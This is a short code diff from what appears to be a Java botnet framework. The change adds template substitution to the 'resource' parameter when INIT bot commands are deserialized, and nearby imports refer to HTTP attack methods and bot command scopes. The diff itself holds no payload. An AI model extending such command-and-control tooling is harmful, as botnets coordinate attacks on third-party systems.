@@ -27,6 +27,7 @@
 package com.acmutv.botnet.core.command.json;
 
 import com.acmutv.botnet.config.AppConfigurationService;
+import com.acmutv.botnet.config.util.TemplateEngine;
 import com.acmutv.botnet.core.attack.HttpAttackMethod;
 import com.acmutv.botnet.core.command.BotCommand;
 import com.acmutv.botnet.core.command.CommandScope;
@@ -103,7 +104,7 @@ public class BotCommandDeserializer extends StdDeserializer<BotCommand> {
         case INIT:
           final String resourceDefault = AppConfigurationService.getConfigurations().getInitResource();
           final String resource = (node.has("resource")) ?
-              node.get("resource").asText() : resourceDefault;
+              TemplateEngine.getInstance().replace(node.get("resource").asText()) : resourceDefault;
           cmd.getParams().put("resource", resource);
           break;
 
